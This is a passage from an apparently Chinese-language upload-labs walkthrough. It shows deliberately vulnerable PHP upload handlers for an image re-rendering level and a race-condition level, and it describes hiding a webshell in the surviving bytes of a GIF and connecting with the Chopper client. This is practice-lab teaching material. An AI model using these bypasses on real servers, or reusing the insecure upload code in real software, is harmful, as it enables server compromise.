class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;=UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.basename(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获得上传文件的扩展名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt;= substr(strrchr(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//判断文件后缀与类型，合法才进行上传操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;quot;jpg&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;quot;image/jpeg&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//使用上传的图片生成新的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; = imagecreatefromjpeg(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不是jpg格式的图片！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @unlink(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//给新图片指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                srand(time());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt; = strval(rand()).&lt;span class=&#34;string&#34;&gt;&amp;quot;.jpg&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                imagejpeg(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @unlink(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;quot;png&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//使用上传的图片生成新的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; = imagecreatefrompng(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不是png格式的图片！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @unlink(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;comment&#34;&gt;//给新图片指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                srand(time());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt; = strval(rand()).&lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                imagepng(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @unlink(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;               &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;quot;gif&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;quot;image/gif&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//使用上传的图片生成新的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; = imagecreatefromgif(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不是gif格式的图片！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @unlink(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//给新图片指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                srand(time());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt; = strval(rand()).&lt;span class=&#34;string&#34;&gt;&amp;quot;.gif&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                imagegif(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @unlink(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;先上传一个普通的 gif 图，再进行保存下载，分析两张图片，找到位置相同处进行写马 (图片渲染)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210312094855752.png&#34; alt=&#34;image-20210312094855752&#34;&gt;&lt;/p&gt;
&lt;p&gt;相同位置进行写马&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210312094927938.png&#34; alt=&#34;image-20210312094927938&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210312095224492.png&#34; alt=&#34;image-20210312095224492&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用菜刀进行连接，获得权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210312095313316.png&#34; alt=&#34;image-20210312095313316&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-17pass-18条件竞争&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-17pass-18条件竞争&#34;&gt;#&lt;/a&gt; Pass-17,Pass-18（条件竞争）&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = substr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;,strrpos(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;. rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             rename(&lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            unlink(&lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;pass-19php00截断jpg上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-19php00截断jpg上传&#34;&gt;#&lt;/a&gt; Pass-19 (php00 截断，jpg 上传）&lt;/h2&gt;
